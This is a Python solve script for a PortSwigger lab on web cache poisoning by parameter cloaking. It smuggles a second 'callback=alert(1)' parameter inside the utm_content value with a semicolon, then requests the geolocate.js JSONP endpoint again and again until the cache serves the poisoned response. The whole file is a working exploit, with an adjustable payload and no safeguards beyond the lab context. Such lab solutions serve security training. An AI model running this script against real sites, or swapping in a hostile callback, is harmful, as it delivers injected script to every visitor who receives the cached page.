#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Parameter cloaking.

Smuggles callback=alert(1) inside utm_content value using semicolon parsing.
Cache keys on callback=setCountryCookie; backend uses alert(1) as callback.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    parser = argparse.ArgumentParser(
        description="Solve Web Cache Poisoning Lab 7 (parameter cloaking)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--callback", default="setCountryCookie")
    parser.add_argument("--payload", default="alert(1)")
    parser.add_argument("--max-attempts", type=int, default=20)
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    # Build URL manually to preserve the semicolon (requests would encode it)
    url = f"{lab}/js/geolocate.js?callback={args.callback}&utm_content=foo;callback={args.payload}"

    print(f"[*] Poisoning JSONP endpoint with cloaked callback: {args.payload}")
    for i in range(1, args.max_attempts + 1):
        r = s.get(url)
        cache_status = r.headers.get("X-Cache", "none")
        print(f"[{i}] X-Cache: {cache_status}")
        if args.payload in r.text:
            print(f"[*] Payload confirmed in response body")
        if cache_status == "hit":
            print(f"[+] Cache poisoned! Home page loading {args.callback}() will trigger {args.payload}.")
            return

    print("[-] Cache hit not observed — try more attempts.")


if __name__ == "__main__":
    main()
